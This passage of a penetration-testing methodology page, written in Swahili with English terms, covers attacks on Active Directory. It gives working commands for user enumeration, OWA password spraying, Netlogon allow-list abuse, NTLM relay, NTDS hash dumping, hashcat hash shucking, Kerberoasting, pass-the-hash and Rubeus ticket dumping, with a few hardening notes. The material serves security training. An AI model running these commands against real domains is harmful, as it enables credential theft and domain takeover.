# Methodology ya Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa msingi

**Active Directory** hutumika kama teknolojia ya msingi, inayowawezesha **network administrators** kuunda na kudhibiti kwa ufanisi **domains**, **users**, na **objects** ndani ya network. Imeundwa ili iweze kupanuka, na kuwezesha kupanga idadi kubwa ya users katika **groups** na **subgroups** zinazoweza kudhibitiwa, huku ikidhibiti **access rights** katika viwango mbalimbali.

Muundo wa **Active Directory** una tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** hujumuisha mkusanyiko wa objects, kama vile **users** au **devices**, zinazotumia database moja. **Trees** ni makundi ya domains yaliyounganishwa na muundo wa pamoja, na **forest** ni mkusanyiko wa trees nyingi zilizounganishwa kupitia **trust relationships**, hivyo kuunda tabaka la juu zaidi la muundo wa shirika. **Access** na **communication rights** maalum zinaweza kutengwa katika kila moja ya viwango hivi.

Dhana muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Huhifadhi taarifa zote zinazohusu Active Directory objects.
2. **Object** – Humaanisha entities ndani ya directory, ikiwemo **users**, **groups**, au **shared folders**.
3. **Domain** – Hutumika kama container ya directory objects, na inaweza kuwepo pamoja na domains nyingine ndani ya **forest**, kila moja ikiwa na mkusanyiko wake wa objects.
4. **Tree** – Ni mkusanyiko wa domains zinazoshiriki root domain moja.
5. **Forest** – Ndiyo kilele cha muundo wa shirika katika Active Directory, ikiwa imeundwa na trees kadhaa zenye **trust relationships** kati yake.

**Active Directory Domain Services (AD DS)** hujumuisha services mbalimbali muhimu kwa usimamizi na mawasiliano ya kati ndani ya network. Services hizi zinajumuisha:

1. **Domain Services** – Huweka data katikati na kudhibiti mwingiliano kati ya **users** na **domains**, ikiwemo utendakazi wa **authentication** na **search**.
2. **Certificate Services** – Husimamia uundaji, usambazaji, na udhibiti wa **digital certificates** salama.
3. **Lightweight Directory Services** – Husaidia applications zinazowezeshwa na directory kupitia **LDAP protocol**.
4. **Directory Federation Services** – Hutoa uwezo wa **single-sign-on** wa ku-authenticate users katika web applications nyingi ndani ya session moja.
5. **Rights Management** – Husaidia kulinda nyenzo zenye copyright kwa kudhibiti usambazaji na matumizi yake yasiyoidhinishwa.
6. **DNS Service** – Ni muhimu kwa utatuzi wa **domain names**.

Kwa maelezo ya kina zaidi angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD**, unahitaji **kuelewa** vizuri sana mchakato wa **Kerberos authentication**.\
[**Soma ukurasa huu ikiwa bado hujui jinsi inavyofanya kazi.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kwenda [https://wadcoms.github.io/](https://wadcoms.github.io) ili kupata muhtasari wa haraka wa commands unazoweza kuendesha kwa ajili ya ku-enumerate/kuexploit AD.

> [!WARNING]
> Mawasiliano ya Kerberos kwa kawaida **yanahitaji fully qualified domain name (FQDN)** ili client iweze kupata ticket ya SPN sahihi. Kufikia machine kwa kutumia IP address kwa kawaida hurudi kwenye NTLM badala ya Kerberos.

## Recon ya Active Directory (Bila creds/sessions)

Ikiwa una access tu kwenye mazingira ya AD lakini huna credentials/sessions, unaweza:

- **Pentest network:**
- Scan network, tafuta machines na ports zilizo wazi, na ujaribu **kuexploit vulnerabilities** au **kutoa credentials** kutoka kwao (kwa mfano, [printers zinaweza kuwa targets zinazovutia sana](ad-information-in-printers.md)).
- Ku-enumerate DNS kunaweza kutoa taarifa kuhusu servers muhimu katika domain, kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Angalia [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) ya jumla ili kupata taarifa zaidi kuhusu jinsi ya kufanya hivi.
- **Kagua null na Guest access kwenye smb services** (hii haitafanya kazi kwenye matoleo ya kisasa ya Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina zaidi kuhusu jinsi ya ku-enumerate SMB server unaweza kupatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina zaidi kuhusu jinsi ya ku-enumerate LDAP unaweza kupatikana hapa (zingatia **hasa access ya anonymous**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison network**
- Kusanya credentials [**kwa ku-impersonate services kwa Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pata access kwenye host kwa [**kutumia vibaya relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **kufichua** [**fake UPnP services kwa evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Toa usernames/names kutoka kwenye internal documents, social media, services (hasa web) ndani ya domain environments, na pia kutoka kwenye vyanzo vinavyopatikana hadharani.
- Ukipata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu **username conventions** tofauti za AD (**[**soma hii**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Conventions zinazotumika zaidi ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila moja), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, _random letters 3 na random numbers 3_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username inaombwa**, server itajibu kwa kutumia **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, hivyo kutuwezesha kubaini kuwa username hiyo si halali. **Valid usernames** zitatoa ama **TGT katika AS-REP** response au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, inayoonyesha kuwa user anatakiwa kufanya pre-authentication.
- **No Authentication dhidi ya MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya interface ya MS-NRPC (Netlogon) kwenye domain controllers. Method hii huita function ya `DsrGetDcNameEx2` baada ya ku-bind interface ya MS-NRPC ili kukagua kama user au computer ipo bila credentials zozote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) hutekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ukipata mojawapo ya servers hizi kwenye network, unaweza pia kufanya **user enumeration dhidi yake**. Kwa mfano, unaweza kutumia tool [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Unaweza kupata orodha za usernames katika [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) na hii nyingine ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi katika kampuni** kutoka kwenye hatua ya recon ambayo ulipaswa kuifanya kabla ya hii. Ukiwa na jina na surname, unaweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kutengeneza usernames zinazowezekana kuwa halali.

### Matumizi mabaya ya allow-list ya channel iliyo hatarini ya Netlogon (Onelogon)

Hata baada ya **Zerologon** kurekebishwa kwenye DC, akaunti zilizoruhusiwa waziwazi kwenye allow-list bado zinaweza kufichuliwa na **legacy/vulnerable Netlogon secure-channel behavior**. Configuration hatari ni GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** au registry value inayolingana **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Value hiyo ni **SDDL security descriptor** (tazama [Security Descriptors](security-descriptors.md)). Akaunti au group yoyote iliyopewa ACE inayohusika katika DACL inaweza kulengwa. Kwa mfano, `O:BAG:BAD:(A;;RC;;;WD)` kwa ufanisi inaweka **Everyone** kwenye allow-list.

Workflow ya operator kwa vitendo:

1. **Tambua principals walio kwenye allow-list** kwa kuangalia **SYSVOL/GPO** na **live DC registry**.
2. **Resolve SIDs** zilizopatikana kwenye SDDL hadi kwa AD users/computers halisi, kisha weka kipaumbele kwa **DC machine accounts**, **trust accounts**, na machines nyingine zenye privileged access.
3. Jaribu mara kwa mara **MS-NRPC / Netlogon authentication** ukitumia akaunti iliyo kwenye allow-list.
4. Baada ya kubahatisha kwa mafanikio, tumia vibaya **Netlogon password-setting** kuweka upya password ya target account (public PoC huiweka kuwa empty string).<sup>[[9]](#references)[[10]](#references)</sup>

Mifano ya haraka ya triage / lab kutoka kwenye public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- **scanner** ni muhimu kwa sababu allow-list inayotumika inaweza kuwepo katika **SYSVOL**, kwenye **registry**, au katika vyote viwili.
- Njia ya exploit yenyewe ni muhimu kwa sababu **haihitaji privileges za Domain Admin** baada ya account iliyo hatarini kutambuliwa.
- Kuhatarisha **Domain Controller machine account** kama `DC$` ni hatari hasa kwa sababu kuweka upya password hiyo kunaweza kuwezesha moja kwa moja njia pana zaidi za **AD takeover**.
- Uwezekano wa **Brute-force** hutegemea mode: artifact ya umma inaeleza mbinu ya meet-in-the-middle, **24-bit** brute force wakati computer account nyingine inapatikana, pamoja na variants za **32-bit** zenye kasi ndogo.

Detection / hardening notes:

- Kagua allow-list policy na uondoe kila kitu isipokuwa compatibility exceptions za muda zinazohitajika waziwazi.
- Fuatilia matukio ya DC **System** **5827/5828/5829/5830/5831** ili kugundua miunganisho ya Netlogon iliyo hatarini inayokataliwa, kugunduliwa, au kuruhusiwa waziwazi na policy.
- Chukulia accounts zilizo katika `VulnerableChannelAllowList` kuwa **high-risk** hadi dependency ya zamani iondolewe.

### Knowing one or several usernames

Sawa, unajua tayari kuwa una username halali lakini huna passwords... Kisha jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa user **hana** attribute _DONT_REQ_PREAUTH_, unaweza **request AS_REP message** kwa user huyo, ambayo itakuwa na data iliyosimbwa kwa derivation ya password ya user huyo.
- [**Password Spraying**](password-spraying.md): Jaribu **common passwords** zaidi kwa kila user aliyegunduliwa; huenda user fulani anatumia password dhaifu (zingatia password policy!).
- Kumbuka kuwa unaweza pia **spray OWA servers** ili kujaribu kupata access kwa mail servers za users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Huenda ukaweza **kupata** baadhi ya **challenge hashes** kwa kufanya **poisoning** ya baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration hutoa usernames, email identifiers na naming patterns, candidate hosts, pamoja na services ambazo zinaweza kulazimishwa kufanya authentication. Tumia muktadha huo kutambua [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zinazowezekana za NTLM na njia zinazoweza kuingia katika mazingira ya AD.

### NetExec workspace-driven recon & relay posture checks

- Tumia **`nxcdb` workspaces** kuhifadhi hali ya AD recon kwa kila engagement: `workspace create <name>` huunda SQLite DBs za kila protocol chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badilisha views kwa `proto smb|mssql|winrm` na orodhesha secrets zilizokusanywa kwa `creds`. Futa data nyeti mwenyewe unapomaliza: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Ugunduzi wa haraka wa subnet kwa **`netexec smb <cidr>`** huonyesha **domain**, **OS build**, **SMB signing requirements**, na **Null Auth**. Members zinazoonyesha `(signing:False)` zinaweza kulengwa na **relay**, huku DCs mara nyingi zikihitaji signing.
- Tengeneza **hostnames katika /etc/hosts** moja kwa moja kutoka kwenye output ya NetExec ili kurahisisha targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wakati **SMB relay to the DC is blocked** na signing, bado chunguza mkao wa **LDAP**: `netexec ldap <dc>` huonyesha `(signing:None)` / weak channel binding. DC yenye SMB signing required lakini LDAP signing disabled bado ni target inayofaa kwa **relay-to-LDAP** kwa matumizi mabaya kama **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs wakati mwingine **embed masked admin passwords in HTML**. Kuangalia source/devtools kunaweza kufichua cleartext (mf., `<input value="<password>">`), na kuruhusu Basic-auth access ya kuchanganua/kufikia scan/print repositories.
- Print jobs zilizopatikana zinaweza kuwa na **plaintext onboarding docs** zenye passwords za kila user. Weka pairings zikiwa zimepangwa sawasawa unapojaribu:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Ikiwa unaweza **kufikia PC au shares nyingine** kwa kutumia **null au guest user**, unaweza **kuweka files** (kama SCF file) ambazo zikifikiwa kwa namna fulani zita**trigger NTLM authentication dhidi yako**, ili uweze **kuiba** **NTLM challenge** na kuipasua:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** huchukulia kila NT hash uliyonayo tayari kama password candidate kwa formats nyingine zilizo polepole zaidi, ambazo key material yake hutokana moja kwa moja na NT hash. Badala ya kufanya brute-force ya passphrases ndefu katika Kerberos RC4 tickets, NetNTLM challenges au cached credentials, unaingiza NT hashes kwenye NT-candidate modes za Hashcat na kuiacha ithibitishe password reuse bila kujua plaintext. Hii huwa na nguvu hasa baada ya domain compromise, ambapo unaweza kukusanya maelfu ya NT hashes za sasa na za kihistoria.<sup>[[5]](#references)</sup>

Tumia shucking wakati:

- Una NT corpus kutoka kwa DCSync, SAM/SECURITY dumps au credential vaults na unahitaji kujaribu reuse katika domains/forests nyingine.
- Unakamata Kerberos material inayotumia RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses au DCC/DCC2 blobs.
- Unataka kuthibitisha haraka reuse ya passphrases ndefu zisizoweza kupasuliwa na mara moja kufanya pivot kupitia Pass-the-Hash.

Technique hii **haifanyi kazi** dhidi ya encryption types ambazo keys zake si NT hash (kwa mfano, Kerberos etype 17/18 AES). Ikiwa domain inalazimisha AES-only, lazima urudi kwenye regular password modes.

#### Kuunda NT hash corpus

- **DCSync/NTDS** – Tumia `secretsdump.py` pamoja na history ili kupata seti kubwa iwezekanavyo ya NT hashes (na values zake za awali):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries huongeza kwa kiasi kikubwa candidate pool kwa sababu Microsoft inaweza kuhifadhi hadi hashes 24 za awali kwa kila account. Kwa njia zaidi za kukusanya NTDS secrets tazama:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutoa data ya local SAM/SECURITY na cached domain logons (DCC/DCC2). Ondoa duplicates na ongeza hashes hizo kwenye list ileile ya `nt_candidates.txt`.
- **Fuatilia metadata** – Hifadhi username/domain iliyotoa kila hash (hata kama wordlist ina hex pekee). Hashes zinazolingana hukuonyesha mara moja ni principal gani anayetumia tena password, mara Hashcat inapo-print winning candidate.
- Pendelea candidates kutoka forest ileile au forest inayoaminika; hii huongeza uwezekano wa overlap wakati wa shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **lazima zibaki kama raw 32-hex NT hashes**. Zima rule engines (usiweke `-r`, wala hybrid modes) kwa sababu mangling huharibu candidate key material.
- Modes hizi si lazima ziwe za haraka zaidi, lakini NTLM keyspace (~30,000 MH/s kwenye M3 Max) ni ~100× ya haraka kuliko Kerberos RC4 (~300 MH/s). Kujaribu NT list iliyochaguliwa ni nafuu zaidi kuliko kuchunguza password space yote katika format iliyo polepole.
- Tumia kila mara **Hashcat build ya hivi karibuni** (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modes 31500/31600/35300/35400 zilisambazwa hivi karibuni.<sup>[[7]](#references)</sup>
- Kwa sasa hakuna NT mode ya AS-REQ Pre-Auth, na AES etypes (19600/19700) huhitaji plaintext password kwa sababu keys zake hutokana na PBKDF2 kutoka kwenye passwords za UTF-16LE, si raw NT hashes.

#### Mfano – Kerberoast RC4 (mode 35300)

1. Capture RC4 TGS kwa target SPN ukitumia user mwenye low privileges (tazama ukurasa wa Kerberoast kwa maelezo):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Fanya shuck ya ticket ukitumia NT list yako:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat hutengeneza RC4 key kutoka kwa kila NT candidate na kuthibitisha `$krb5tgs$23$...` blob. Match inathibitisha kuwa service account inatumia mojawapo ya NT hashes ulizonazo tayari.

3. Fanya pivot mara moja kupitia PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Unaweza kuchukua plaintext baadaye kwa hiari ukitumia `hashcat -m 1000 <matched_hash> wordlists/` ikiwa inahitajika.

#### Mfano – Cached credentials (mode 31600)

1. Dump cached logons kutoka kwenye workstation iliyo-compromise:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy DCC2 line ya domain user anayevutia kwenye `dcc2_highpriv.txt` na uifanyie shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Match iliyofanikiwa hutoa NT hash ambayo tayari inajulikana kwenye list yako, ikithibitisha kuwa cached user anatumia tena password. Itumie moja kwa moja kwa PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) au ifanye brute-force katika fast NTLM mode ili kurejesha string.

Workflow ileile hutumika kwa NetNTLM challenge-responses (`-m 27000/27100`) na DCC (`-m 31500`). Match ikitambuliwa, unaweza kuanzisha relay, SMB/WMI/WinRM PtH au kupasua tena NT hash kwa masks/rules offline.



## Kuhesabu Active Directory KWA credentials/session

Kwa awamu hii unahitaji kuwa na **ume-compromise credentials au session ya valid domain account.** Ikiwa una credentials halali au shell kama domain user, **unapaswa kukumbuka kuwa options zilizotolewa awali bado ni options za ku-compromise users wengine**.

Kabla ya kuanza authenticated enumeration, elewa **Kerberos double-hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ku-compromise account ni **hatua kubwa kuelekea ku-assess domain**, kwa sababu inawezesha authenticated **Active Directory enumeration**:

Kuhusu [**ASREPRoast**](asreproast.md), sasa unaweza kupata kila user anayeweza kuwa vulnerable, na kuhusu [**Password Spraying**](password-spraying.md) unaweza kupata **list ya usernames zote** na kujaribu password ya account iliyo-compromise, passwords tupu na passwords mpya zenye matumaini.

- Unaweza kutumia [**CMD kufanya basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Unaweza pia kutumia [**powershell kwa recon**](../basic-powershell-for-pentesters/index.html), ambayo itakuwa stealthier
- Unaweza pia [**kutumia powerview**](../basic-powershell-for-pentesters/powerview.md) ili kutoa taarifa zenye maelezo zaidi
- Tool nyingine bora kwa recon katika active directory ni [**BloodHound**](bloodhound.md). **Si stealthy sana** (kutegemea collection methods unazotumia), lakini **ikiwa hujali** hilo, unapaswa kabisa kuijaribu. Tafuta users wanaoweza kutumia RDP, tafuta path kuelekea groups nyingine, n.k.
- **Tools nyingine za automated AD enumeration ni:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records za AD**](ad-dns-records.md), kwa sababu zinaweza kuwa na taarifa zinazovutia.
- **Tool yenye GUI** unayoweza kutumia ku-enumerate directory ni **AdExplorer.exe** kutoka kwenye **SysInternal** Suite.
- Unaweza pia kutafuta kwenye LDAP database ukitumia **ldapsearch** ili kutafuta credentials katika fields _userPassword_ na _unixUserPassword_, au hata _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) kwa methods nyingine.
- Ikiwa unatumia **Linux**, unaweza pia ku-enumerate domain ukitumia [**pywerview**](https://github.com/the-useless-one/pywerview).
- Unaweza pia kujaribu automated tools kama:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Kutoa users wote wa domain**

Ni rahisi sana kupata domain usernames zote kutoka Windows (`net user /domain` ,`Get-DomainUser` au `wmic useraccount get name,sid`). Katika Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Hata kama sehemu hii ya Enumeration inaonekana ndogo, ndiyo sehemu muhimu zaidi kati ya zote. Fikia links (hasa za cmd, powershell, powerview na BloodHound), jifunze jinsi ya ku-enumerate domain na fanya mazoezi hadi ujisikie comfortable. Wakati wa assessment, hii ndiyo moment muhimu ya kupata njia yako kuelekea DA au kuamua kuwa hakuna kinachoweza kufanywa.

### Kerberoast

Kerberoasting inahusisha kupata **TGS tickets** zinazotumiwa na services zilizounganishwa na user accounts na kupasua encryption yake—ambayo inategemea user passwords—**offline**.

Maelezo zaidi kuhusu hili:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Baada ya kupata credentials, unaweza kuangalia ikiwa una access kwenye **machine** yoyote. Kwa hilo, unaweza kutumia **CrackMapExec** kujaribu ku-connect kwenye servers kadhaa kwa protocols tofauti, kulingana na port scans zako.

### Local Privilege Escalation

Ikiwa ume-compromise credentials au session kama regular domain user na unaweza kufikia **machine yoyote katika domain**, tafuta path ya **ku-escalate privileges locally na kukusanya credentials**. Local administrator privileges zinaweza kukuruhusu **ku-dump hashes za users wengine** kutoka memory (LSASS) na local storage (SAM).

Kuna ukurasa kamili katika kitabu hiki kuhusu [**local privilege escalation katika Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Ni **unlikely sana** kwamba utapata **tickets** katika **current user** zinazokupa **permission ya kufikia** resources usizotarajia, lakini unaweza kuangalia:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ukiwa na domain credentials au user session, kagua tena NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): authenticated enumeration na coercion techniques zinaweza kufichua relay paths ambazo hazikupatikana wakati wa unauthenticated reconnaissance.

### Kutafuta Creds katika Computer Shares | SMB Shares

Sasa kwa kuwa una basic credentials, unapaswa kuangalia kama unaweza **kupata** **faili za kuvutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo manually, lakini ni kazi yenye marudio mengi na ya kuchosha sana (na zaidi ikiwa utapata mamia ya docs unazohitaji kukagua).

[**Fuata link hii kujifunza kuhusu tools unazoweza kutumia.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kuiba NTLM Creds

Ikiwa unaweza **kufikia PC nyingine au shares**, unaweza **kuweka files** (kama SCF file) ambazo zikifikiwa kwa namna fulani zita**anzisha NTLM authentication dhidi yako**, ili uweze **kuiba** **NTLM challenge** na ku-crack:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Vulnerability hii ilimwezesha user yeyote aliye-authenticate **ku-compromise domain controller**.

{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation kwenye Active Directory UKIWA NA privileged credentials/session

**Kwa techniques zifuatazo, regular domain user haitoshi; unahitaji privileges/credentials maalum ili kufanya attacks hizi.**

### Hash extraction

Tunatumaini umeweza **ku-compromise** account ya **local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) ikijumuisha relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa kudump hashes zote zilizo kwenye memory na zilizo local.\
[**Soma ukurasa huu kuhusu njia mbalimbali za kupata hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara tu unapokuwa na hash ya user**, unaweza kuitumia **kumu-impersonate**.\
Unahitaji kutumia **tool** ambayo **itafanya** **NTLM authentication kwa kutumia** hiyo **hash**, **au** unaweza kuunda **sessionlogon** mpya na **ku-inject** hiyo **hash** ndani ya **LSASS**, ili wakati **NTLM authentication inapofanywa**, **hash hiyo itumike.** Chaguo la mwisho ndilo linalofanywa na mimikatz.\
[**Soma ukurasa huu kwa maelezo zaidi.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Attack hii inalenga **kutumia NTLM hash ya user kuomba Kerberos tickets**, kama mbadala wa Pass The Hash ya kawaida kupitia NTLM protocol. Kwa hiyo, hii inaweza kuwa **muhimu hasa kwenye networks ambapo NTLM protocol imezimwa** na **Kerberos pekee inaruhusiwa** kama authentication protocol.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika attack method ya **Pass The Ticket (PTT)**, attackers **huiba authentication ticket ya user** badala ya password au hash values yake. Ticket hii iliyoibwa hutumiwa kisha **kumu-impersonate user**, na kupata access isiyoidhinishwa kwa resources na services ndani ya network.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

